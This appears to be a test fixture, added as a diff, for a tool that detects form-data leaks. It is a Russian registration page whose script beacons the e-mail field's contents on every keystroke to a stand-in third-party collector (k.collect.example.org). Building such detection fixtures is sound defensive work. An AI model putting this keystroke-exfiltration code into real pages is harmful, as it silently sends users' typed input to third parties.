@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8" />
+    <title>forms: keylogger beacon</title>
+  </head>
+  <body>
+    <h1 id="title">Регистрация (сбор ввода по нажатиям)</h1>
+    <!-- A "session collector" sends the field content on every input event with navigator.sendBeacon (text/plain JSON
+         {"v": ...}) to a third party: the last beacon carries the whole value, usually before the extension's
+         debounced fingerprint arrives (reverse match through the token ring). -->
+    <form id="form" action="#" onsubmit="return false">
+      <label>E-mail <input id="email" type="email" name="email" autocomplete="email" /></label>
+    </form>
+    <script src="lib.js"></script>
+    <script>
+      var endpoint = window.formsLib.receiver('k.collect.example.org') + '/fsink/k';
+      function send(value) {
+        navigator.sendBeacon(endpoint, JSON.stringify({ v: value }));
+        window.formsLib.note('beacon');
+      }
+      var field = document.getElementById('email');
+      field.addEventListener('input', function () {
+        send(field.value);
+      });
+      field.addEventListener('blur', function () {
+        if (field.value.length > 0) send(field.value);
+      });
+    </script>
+  </body>
+</html>
